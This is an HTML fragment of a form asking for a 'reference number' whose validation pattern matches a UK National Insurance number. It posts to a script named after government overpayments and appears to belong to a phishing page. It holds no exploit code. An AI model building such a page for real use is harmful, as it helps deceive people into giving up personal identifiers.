...
<main id="content" role="main" class="group"><header class="page-header group"><div>
	 ...
	 <h2>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Please Enter Your Reference Number </h2>
    </div>
  </header>
  <div>
  <form action="./Overpayments_pay_gov.php" method="get" autocomplete="off" >
  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<input type="text" style="text-transform: uppercase" pattern="[A-Za-z]{2}[0-9]{6}[ABCDabcd]{1}" oninvalid="setCustomValidity('Please enter a valid reference')"
    onchange="try{setCustomValidity('')}catch(e){}"  maxlength="10" name="refID" id="refID" class="text" value="" />
  <input type="submit" name="continue" id="booking-login" value="Continue" class="button" />
  </form>
